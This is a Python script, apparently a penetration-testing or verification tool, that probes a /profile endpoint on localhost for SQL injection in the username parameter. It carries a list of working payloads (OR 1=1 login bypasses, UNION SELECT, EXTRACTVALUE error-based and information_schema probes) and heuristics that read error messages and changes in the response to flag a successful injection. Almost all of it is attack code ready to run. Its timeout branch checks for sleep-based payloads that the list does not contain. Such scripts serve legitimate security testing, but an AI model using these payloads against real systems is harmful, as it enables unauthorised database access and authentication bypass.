#!/usr/bin/env python3
import requests
import json
import sys
import urllib.parse
from requests.exceptions import RequestException, Timeout, ConnectionError

def exploit():
    """
    Test for SQL injection vulnerability in the /profile endpoint's username parameter
    """
    
    # Configuration
    base_url = "http://localhost:3000"
    endpoint = "/profile"
    target_url = f"{base_url}{endpoint}"
    
    # Initialize result structure
    result = {
        "vulnerability_id": "profile-sql-injection-username",
        "target_url": target_url,
        "vulnerability_type": "SQL Injection",
        "status": "unknown",
        "vulnerable": False,
        "evidence": [],
        "error": None,
        "payloads_tested": []
    }
    
    # SQL injection payloads to test (read-only, non-destructive)
    payloads = [
        # Basic OR injection
        "admin' OR '1'='1'--",
        "admin' OR 1=1--",
        "' OR '1'='1'--",
        "' OR 1=1#",
        
        # Union-based injection (information gathering)
        "' UNION SELECT 1,2,3--",
        "admin' UNION SELECT NULL,NULL,NULL--",
        
        # Time-based blind injection (minimal delay)
        "admin' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
        
        # Error-based injection
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--",
        "admin' OR (SELECT COUNT(*) FROM information_schema.tables)>0--"
    ]
    
    try:
        # First, get a baseline response with normal input
        baseline_params = {"username": "admin"}
        baseline_response = requests.get(target_url, params=baseline_params, timeout=10)
        baseline_status = baseline_response.status_code
        baseline_content = baseline_response.text
        baseline_length = len(baseline_content)
        
        result["baseline"] = {
            "status_code": baseline_status,
            "content_length": baseline_length
        }
        
        # Test each SQL injection payload
        for payload in payloads:
            try:
                # URL encode the payload
                encoded_payload = urllib.parse.quote(payload)
                
                # Prepare test parameters
                test_params = {"username": payload}
                
                # Send the request with payload
                response = requests.get(target_url, params=test_params, timeout=10)
                
                # Record payload test details
                payload_result = {
                    "payload": payload,
                    "encoded_payload": encoded_payload,
                    "status_code": response.status_code,
                    "content_length": len(response.text),
                    "response_time": response.elapsed.total_seconds()
                }
                
                result["payloads_tested"].append(payload_result)
                
                # Analyze response for SQL injection indicators
                indicators_found = []
                
                # Check for SQL error messages
                sql_errors = [
                    "mysql_fetch", "ORA-", "Microsoft OLE DB", "ODBC SQL",
                    "SQLServer JDBC Driver", "PostgreSQL", "Warning: mysql",
                    "valid MySQL result", "MySqlClient", "SQL syntax",
                    "sqlite3.OperationalError", "sqlite3.DatabaseError",
                    "ORA-00921", "ORA-00936", "ORA-00933", "Unclosed quotation",
                    "Microsoft Access Driver", "JET Database", "Access Database",
                    "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException"
                ]
                
                response_lower = response.text.lower()
                for error in sql_errors:
                    if error.lower() in response_lower:
                        indicators_found.append(f"SQL error message: {error}")
                
                # Check for significant content length differences
                if abs(len(response.text) - baseline_length) > 500:
                    indicators_found.append("Significant content length difference")
                
                # Check for status code changes that might indicate injection
                if response.status_code != baseline_status and response.status_code not in [400, 404]:
                    indicators_found.append(f"Status code changed from {baseline_status} to {response.status_code}")
                
                # Check for common SQL injection success indicators
                success_indicators = [
                    "welcome", "dashboard", "profile data", "user information",
                    "admin panel", "unauthorized access", "login successful"
                ]
                
                for indicator in success_indicators:
                    if indicator.lower() in response_lower and indicator.lower() not in baseline_content.lower():
                        indicators_found.append(f"Potential bypass indicator: {indicator}")
                
                # Check for UNION injection success (multiple columns data)
                if "union" in payload.lower() and response.status_code == 200:
                    if len(response.text) > baseline_length * 1.5:
                        indicators_found.append("UNION injection may have succeeded")
                
                # If indicators found, mark as potentially vulnerable
                if indicators_found:
                    payload_result["indicators"] = indicators_found
                    result["evidence"].append({
                        "payload": payload,
                        "indicators": indicators_found,
                        "response_snippet": response.text[:200] + "..." if len(response.text) > 200 else response.text
                    })
                    result["vulnerable"] = True
                
            except Timeout:
                result["payloads_tested"].append({
                    "payload": payload,
                    "error": "Request timeout"
                })
                # Timeout could indicate time-based SQL injection
                if "sleep" in payload.lower() or "waitfor" in payload.lower():
                    result["evidence"].append({
                        "payload": payload,
                        "indicators": ["Request timeout - possible time-based injection"]
                    })
                    result["vulnerable"] = True
                
            except RequestException as e:
                result["payloads_tested"].append({
                    "payload": payload,
                    "error": str(e)
                })
        
        # Determine final status
        if result["vulnerable"]:
            result["status"] = "vulnerable"
        else:
            result["status"] = "not_vulnerable"
            
    except ConnectionError:
        result["error"] = "Could not connect to target URL"
        result["status"] = "error"
        
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
        result["status"] = "error"
    
    return result

if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))